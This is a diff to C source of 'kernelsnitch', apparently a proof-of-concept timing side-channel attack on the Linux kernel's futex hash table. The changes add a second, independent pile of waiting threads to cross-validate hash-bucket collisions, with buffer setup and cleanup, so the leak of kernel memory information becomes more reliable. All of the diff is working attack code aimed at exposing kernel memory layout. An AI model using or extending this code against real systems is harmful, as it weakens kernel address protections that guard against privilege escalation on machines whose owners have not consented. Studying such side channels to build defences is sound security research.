@@ -93,6 +93,16 @@ struct kernelsnitch_shared_state {
     volatile size_t candidate_max;
     volatile size_t *times;
     volatile size_t *t_before;
+    volatile size_t *times2;
+    volatile size_t *t_before2;
+    volatile size_t *candidate1_idx;
+    volatile size_t *candidate2_idx;
+    volatile size_t *accepted_idx;
+    volatile size_t candidate1_count;
+    volatile size_t candidate2_count;
+    volatile size_t accepted_count;
+    volatile size_t pile2_anchor;
+    volatile size_t pile2_anchor_id;
     volatile size_t found;
     volatile size_t mm_struct;
     volatile size_t dbg_any_match; /* diagnostic: candidates where >=2 addrs share a bucket */
@@ -122,21 +132,23 @@ static int __futex(unsigned int *uaddr, int futex_op, unsigned int val, const st
  */
 struct inc_arg {
     struct kernelsnitch_shared_state *ks;
-    size_t id;
+    unsigned int *uaddr;
+    int futex_op;
+    unsigned int val3;
     size_t core;
 };
 static void *__do_increase(void *arg)
 {
     struct inc_arg *inc_arg = (struct inc_arg *)arg;
     struct kernelsnitch_shared_state *ks = inc_arg->ks;
-    size_t id = inc_arg->id;
     size_t core = inc_arg->core;
     /* pin this piled waiter away from the measuring core to avoid preempting it */
     cpu_set_t cpuset;
     CPU_ZERO(&cpuset);
     CPU_SET(core, &cpuset);
     sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
-    SYSCHK(__futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0));
+    SYSCHK(__futex(inc_arg->uaddr, inc_arg->futex_op, 0, NULL, NULL,
+                   inc_arg->val3));
     free(inc_arg);
     return 0;
 }
@@ -147,19 +159,37 @@ static void *__do_increase(void *arg)
  * @arg id: identifier of the futex user-space address to be used for the increase
  * @arg amount: increase
  */
-static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t amount)
+static int __increase_addr(struct kernelsnitch_shared_state *ks, unsigned int *uaddr,
+                           size_t amount, int futex_op, unsigned int val3)
 {
     pthread_t tid;
     size_t ncpus = (size_t)sysconf(_SC_NPROCESSORS_ONLN);
     if (ncpus < 2) ncpus = 2;
+    if (!uaddr || (((size_t)uaddr % sizeof(unsigned int)) != 0)) {
+        errno = EINVAL;
+        return -1;
+    }
     for (size_t i = 0; i < amount; ++i) {
         struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
-        inc_arg->id = id;
+        if (!inc_arg) {
+            errno = ENOMEM;
+            return -1;
+        }
+        inc_arg->uaddr = uaddr;
         inc_arg->ks = ks;
+        inc_arg->futex_op = futex_op;
+        inc_arg->val3 = val3;
         inc_arg->core = 1 + (i % (ncpus - 1));  /* cores 1..N-1, keep core 0 for the measurer */
         SYSCHK(pthread_create(&tid, 0, __do_increase, (void *)inc_arg));
     }
     WAIT();
+    return 0;
+}
+
+static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t amount)
+{
+    (void)__increase_addr(ks, (unsigned int *)&ks->inc_futex[id], amount,
+                          FUTEX_WAIT_PRIVATE, 0);
 }
 
 /**
@@ -328,6 +358,16 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
     ks->candidate_max = 4096;
     ks->candidate_count = 0;
     ks->candidate_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->candidate_max, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
+    ks->times2 = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
+    ks->t_before2 = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
+    ks->candidate1_idx = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->candidate_max, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
+    ks->candidate2_idx = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->candidate_max, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
+    ks->accepted_idx = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
+    ks->candidate1_count = 0;
+    ks->candidate2_count = 0;
+    ks->accepted_count = 0;
+    ks->pile2_anchor = 0;
+    ks->pile2_anchor_id = 0;
 
     if (ks->verbose) pr_info("parameters cpu (%zd) mm_struct sz (%zx) mm slab order (%zd) thread cnt (%zd) collisions (%zd) mte %s\n",
         ks->cpu_cnt,
@@ -357,9 +397,13 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     size_t wanted;
     size_t futex_addr;
     size_t id;
+    size_t anchor_id;
     ASSERT_pr((ks->state == KERNELSNITCH_INIT), "wrong state\n");
     ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
-    wanted = ks->collisions - 1;
+    wanted = ks->collisions;
+    ks->candidate1_count = 0;
+    ks->candidate2_count = 0;
+    ks->accepted_count = 0;
 
     /* robust empty-bucket baseline: min over several probes */
     size_t approx_time = __measure((size_t)&ks->futexes[0]);
@@ -373,6 +417,7 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
      * colliders from system-noise/contended-bucket false positives */
     ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
     if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
+    ks->t_before[0] = __measure((size_t)&ks->inc_futex[ID]);
 
     /* phase 1: pre-pile wake times */
     size_t total = ks->total_futexes;
@@ -388,6 +433,7 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     /* pile the bucket */
     __increase(ks, ID, APPENDED_FUTEXES);
     if (ks->verbose) pr_info("start finding collisisons\n");
+    ks->times[0] = __measure((size_t)&ks->inc_futex[ID]);
 
     size_t threshold = approx_time * KERNELSNITCH_THRESHOLD_MULT;
     if (ks->verbose) pr_info("collision threshold approx=%zu thr=%zu\n",
@@ -401,12 +447,9 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         ks->times[i] = __measure(futex_addr);
         if (ks->times[i] > threshold &&
             ks->times[i] > t_before[i] * 3) {
-            if (count < wanted) {
-                count++;
-                ks->futex_addrs[count] = futex_addr;
-            }
-            if (ks->candidate_count < ks->candidate_max) {
-                ks->candidate_addrs[ks->candidate_count++] = futex_addr;
+            if (ks->candidate1_count < ks->candidate_max) {
+                /* candidate indices are futex byte offsets, not loop counters */
+                ks->candidate1_idx[ks->candidate1_count++] = id;
             }
             if (ks->verbose) pr_info("  %016zx (before=%zu after=%zu)\n",
                                      futex_addr, t_before[i],
@@ -419,11 +462,112 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     __futex((unsigned int *)&ks->inc_futex[ID], FUTEX_WAKE_PRIVATE,
             APPENDED_FUTEXES + 16, NULL, NULL, 0);
 
+    if (ks->candidate1_count == 0) {
+        pr_warning("first pile found no candidates -> cannot continue\n");
+        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
+        return;
+    }
+
+    /* Cross-validate the timing-pile result with a second independent pile.
+     * The second anchor is a first-pile candidate: if it is a true collider,
+     * both piles exercise the same kernel hash bucket.  Only addresses seen in
+     * both candidate sets are accepted; the two anchors are also retained. */
+    anchor_id = 0;
+    for (size_t a = 0; a < ks->candidate1_count; ++a) {
+        size_t candidate = (size_t)ks->candidate1_idx[a];
+        volatile unsigned int *anchor_word;
+
+        if (candidate >= FUTEX_SZ)
+            continue;
+        anchor_word = (volatile unsigned int *)&ks->futexes[candidate];
+        if ((((size_t)anchor_word) % sizeof(unsigned int)) != 0)
+            continue;
+
+        /* A plain WAIT only reports EAGAIN for a value mismatch, but keep
+         * the second pile's precondition explicit and deterministic. */
+        if (*anchor_word != 0)
+            *anchor_word = 0;
+        anchor_id = candidate;
+        break;
+    }
+    if (anchor_id == 0) {
+        pr_warning("first pile had no valid aligned anchor -> cannot continue\n");
+        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
+        return;
+    }
+    ks->pile2_anchor_id = anchor_id;
+    ks->pile2_anchor = (size_t)&ks->futexes[anchor_id];
+    if (ks->verbose)
+        pr_info("pile2 anchor id=%zu addr=%016zx align=%u value=%u\n",
+                anchor_id, (size_t)ks->pile2_anchor,
+                (unsigned int)((size_t)ks->pile2_anchor % sizeof(unsigned int)),
+                *(volatile unsigned int *)ks->pile2_anchor);
+    usleep(2000);
+
+    for (size_t i = 2; i < total; ++i) {
+        id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
+        if (id >= FUTEX_SZ)
+            break;
+        ks->t_before2[i] = __measure((size_t)&ks->futexes[id]);
+    }
+    if (__increase_addr(ks, (unsigned int *)ks->pile2_anchor, APPENDED_FUTEXES,
+                        FUTEX_WAIT_PRIVATE, 0) != 0) {
+        pr_warning("second pile preconditions failed -> cannot continue\n");
+        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
+        return;
+    }
+    if (ks->verbose) pr_info("start second pile id=%zu addr=%016zx\n",
+                             anchor_id, (size_t)ks->pile2_anchor);
+    for (size_t i = 2; i < total; ++i) {
+        id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
+        if (id >= FUTEX_SZ)
+            break;
+        futex_addr = (size_t)&ks->futexes[id];
+        ks->times2[i] = __measure(futex_addr);
+        if (ks->times2[i] > threshold &&
+            ks->times2[i] > ks->t_before2[i] * 3) {
+            if (ks->candidate2_count < ks->candidate_max) {
+                ks->candidate2_idx[ks->candidate2_count++] = id;
+            }
+            if (ks->verbose) pr_info("  pile2 %016zx (before=%zu after=%zu)\n",
+                                     futex_addr, (size_t)ks->t_before2[i],
+                                     (size_t)ks->times2[i]);
+        }
+    }
+    __futex((unsigned int *)ks->pile2_anchor, FUTEX_WAKE_PRIVATE,
+            APPENDED_FUTEXES + 16, NULL, NULL, 0);
+
+    ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
+    ks->futex_addrs[1] = ks->pile2_anchor;
+    ks->accepted_idx[0] = (size_t)-1;
+    ks->accepted_idx[1] = anchor_id;
+    ks->accepted_count = 2;
+    count = 2;
+    for (size_t a = 0; a < ks->candidate1_count && count < wanted; ++a) {
+        size_t i = (size_t)ks->candidate1_idx[a];
+        int in_second = 0;
+        for (size_t b = 0; b < ks->candidate2_count; ++b) {
+            if ((size_t)ks->candidate2_idx[b] == i) {
+                in_second = 1;
+                break;
+            }
+        }
+        if (!in_second || i == anchor_id)
+            continue;
+        ks->futex_addrs[count++] = (size_t)&ks->futexes[i];
+        ks->accepted_idx[count - 1] = i;
+        ks->accepted_count++;
+    }
+
     if (wanted == count) {
-        if (ks->verbose) pr_info("found %zd collisisons\n", count);
+        if (ks->verbose) pr_info("found %zd accepted collisions (pile1=%zu pile2=%zu)\n",
+                                 count, (size_t)ks->candidate1_count,
+                                 (size_t)ks->candidate2_count);
         ks->state = KERNELSNITCH_COLLISIONS_FOUND;
     } else {
-        pr_warning("only found %zd collisions -> cannot continue\n", count);
+        pr_warning("only found %zd accepted collisions -> cannot continue (pile1=%zu pile2=%zu)\n",
+                   count, (size_t)ks->candidate1_count,
+                   (size_t)ks->candidate2_count);
         ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
     }
 }
@@ -484,6 +628,16 @@ size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
     ks->futex_addrs = 0;
     munmap((void *)ks->candidate_addrs, sizeof(size_t)*ks->candidate_max);
     ks->candidate_addrs = 0;
+    munmap((void *)ks->times2, sizeof(size_t)*ks->total_futexes);
+    ks->times2 = 0;
+    munmap((void *)ks->t_before2, sizeof(size_t)*ks->total_futexes);
+    ks->t_before2 = 0;
+    munmap((void *)ks->candidate1_idx, sizeof(size_t)*ks->candidate_max);
+    ks->candidate1_idx = 0;
+    munmap((void *)ks->candidate2_idx, sizeof(size_t)*ks->candidate_max);
+    ks->candidate2_idx = 0;
+    munmap((void *)ks->accepted_idx, sizeof(size_t)*(ks->collisions + 1));
+    ks->accepted_idx = 0;
     munmap((void *)ks->futexes, FUTEX_SZ);
     ks->futexes = 0;
     size_t ret = ks->mm_struct;
@@ -529,7 +683,7 @@ void kernelsnitch_print_state(struct kernelsnitch_shared_state *ks)
 void kernelsnitch_print_collisions(struct kernelsnitch_shared_state *ks)
 {
     pr_info("collisions:\n");
-    for (size_t i = 2; i < ks->collisions; ++i) {
+    for (size_t i = 0; i < ks->accepted_count; ++i) {
         size_t addr = ks->futex_addrs[i];
         pr_info("  %016zx\n", addr);
     }
